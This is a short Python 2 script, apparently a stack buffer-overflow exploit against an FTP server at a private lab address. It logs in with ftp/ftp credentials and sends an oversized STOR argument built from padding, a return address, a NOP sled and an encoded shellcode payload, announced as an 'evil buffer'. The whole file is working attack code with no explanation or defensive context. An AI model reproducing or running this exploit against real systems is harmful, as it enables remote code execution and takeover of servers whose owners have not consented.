#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode=("\xda\xd8\xbf\x4b\x36\x12\x12\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x53\x83\xc0\x04\x31\x78\x13\x03\x33\x25\xf0\xe7\x3f\xa1\x76"
"\x07\xbf\x32\x17\x81\x5a\x03\x17\xf5\x2f\x34\xa7\x7d\x7d\xb9"
"\x4c\xd3\x95\x4a\x20\xfc\x9a\xfb\x8f\xda\x95\xfc\xbc\x1f\xb4"
"\x7e\xbf\x73\x16\xbe\x70\x86\x57\x87\x6d\x6b\x05\x50\xf9\xde"
"\xb9\xd5\xb7\xe2\x32\xa5\x56\x63\xa7\x7e\x58\x42\x76\xf4\x03"
"\x44\x79\xd9\x3f\xcd\x61\x3e\x05\x87\x1a\xf4\xf1\x16\xca\xc4"
"\xfa\xb5\x33\xe9\x08\xc7\x74\xce\xf2\xb2\x8c\x2c\x8e\xc4\x4b"
"\x4e\x54\x40\x4f\xe8\x1f\xf2\xab\x08\xf3\x65\x38\x06\xb8\xe2"
"\x66\x0b\x3f\x26\x1d\x37\xb4\xc9\xf1\xb1\x8e\xed\xd5\x9a\x55"
"\x8f\x4c\x47\x3b\xb0\x8e\x28\xe4\x14\xc5\xc5\xf1\x24\x84\x81"
"\x36\x05\x36\x52\x51\x1e\x45\x60\xfe\xb4\xc1\xc8\x77\x13\x16"
"\x2e\xa2\xe3\x88\xd1\x4d\x14\x81\x15\x19\x44\xb9\xbc\x22\x0f"
"\x39\x40\xf7\xba\x31\xe7\xa8\xd8\xbc\x57\x19\x5d\x6e\x30\x73"
"\x52\x51\x20\x7c\xb8\xfa\xc9\x81\x43\x15\x56\x0f\xa5\x7f\x76"
"\x59\x7d\x17\xb4\xbe\xb6\x80\xc7\x94\xee\x26\x8f\xfe\x29\x49"
"\x10\xd5\x1d\xdd\x9b\x3a\x9a\xfc\x9b\x16\x8a\x69\x0b\xec\x5b"
"\xd8\xad\xf1\x71\x8a\x4e\x63\x1e\x4a\x18\x98\x89\x1d\x4d\x6e"
"\xc0\xcb\x63\xc9\x7a\xe9\x79\x8f\x45\xa9\xa5\x6c\x4b\x30\x2b"
"\xc8\x6f\x22\xf5\xd1\x2b\x16\xa9\x87\xe5\xc0\x0f\x7e\x44\xba"
"\xd9\x2d\x0e\x2a\x9f\x1d\x91\x2c\xa0\x4b\x67\xd0\x11\x22\x3e"
"\xef\x9e\xa2\xb6\x88\xc2\x52\x38\x43\x47\x62\x73\xc9\xee\xeb"
"\xda\x98\xb2\x71\xdd\x77\xf0\x8f\x5e\x7d\x89\x6b\x7e\xf4\x8c"
"\x30\x38\xe5\xfc\x29\xad\x09\x52\x49\xe4")

buffer = "A" *966 + "\x53\x93\x42\x7E" + '\x42'*16 + '\x90'*16 + shellcode +  '\x42'*688

print "\nSending evil buffer..."
s.connect(('172.16.73.129',21))
data = s.recv(1023)
s.send('USER ftp\r\n')
data = s.recv(1024)
s.send('PASS ftp\r\n')
data = s.recv(1024)
s.send('STOR ' + buffer + '\r\n')
s.close()